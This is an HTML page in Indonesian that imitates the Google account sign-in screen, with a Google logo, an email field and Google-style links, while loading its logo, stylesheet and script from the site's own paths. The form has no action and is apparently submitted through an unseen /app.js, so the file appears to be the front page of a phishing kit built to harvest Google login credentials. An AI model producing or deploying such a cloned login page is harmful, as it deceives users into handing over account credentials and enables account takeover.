<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Masuk - Akun Google</title>
<link rel="icon" type="image/x-icon" href="/favicon.ico">
<meta name="theme-color" content="#1a73e8">
<link rel="stylesheet" href="/style.css">
</head>
<body>
<div class="wrapper">
  <div class="card" id="card">
    <div class="logo"><img src="/logo.png" alt="Google" style="width:80px;height:auto;"></div>
    <h1 id="title">Masuk</h1>
    <p class="sub" id="subtitle">Gunakan Akun Google Anda</p>
    <form id="loginForm" autocomplete="off">
      <div class="field" id="emailField">
        <input type="email" id="email" name="email" required autofocus>
        <label for="email">Email atau nomor telepon</label>
      </div>
      <div class="actions"><a href="#" class="link">Lupa email?</a></div>
      <div class="actions">
        <p class="info">Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi. <a href="#" class="link">Pelajari lebih lanjut</a></p>
      </div>
      <div class="buttons"><button type="button" class="btn-text" id="nextBtn">Berikutnya</button></div>
    </form>
    <div class="lang"><select><option>Bahasa Indonesia</option><option>English (United States)</option></select></div>
  </div>
  <footer class="footer"><a href="#">Bantuan</a><a href="#">Privasi</a><a href="#">Persyaratan</a></footer>
</div>
<script src="/app.js"></script>
</body>
</html>
